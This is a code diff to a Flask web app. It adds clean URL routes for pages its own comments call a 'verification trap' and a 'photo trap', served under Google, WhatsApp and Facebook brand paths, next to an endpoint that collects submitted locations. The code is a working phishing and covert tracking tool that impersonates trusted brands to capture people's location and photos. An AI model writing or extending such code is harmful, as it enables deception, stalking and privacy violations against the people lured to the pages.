@@ -25,16 +25,29 @@ latest_location = {
 # ROUTES
 # =============================================
 
+# --- Clean URL Routes (NEW) ---
+@app.route('/<brand>/verify')
+def verify_trap_clean(brand):
+    """Clean URL for verification trap: /google/verify, /whatsapp/verify, etc."""
+    return render_template('index.html', brand=brand)
+
+@app.route('/<brand>/photo')
+def photo_trap_clean(brand):
+    """Clean URL for photo trap: /whatsapp/photo, /facebook/photo, etc."""
+    return render_template('photo.html', brand=brand)
+
+# --- Legacy Routes (keep for backward compatibility) ---
 @app.route('/')
 def target_page():
     template = request.args.get('template', 'google')
-    return render_template('index.html', template=template)
+    return render_template('index.html', brand=None)  # brand=None => fallback to query param
 
 @app.route('/photo')
 def photo_trap():
     template = request.args.get('template', 'whatsapp')
-    return render_template('photo.html', template=template)
+    return render_template('photo.html', brand=None)  # brand=None => fallback to query param
 
+# --- API Endpoints (unchanged) ---
 @app.route('/send-location', methods=['POST'])
 def receive_location():
     global users, all_history, latest_location
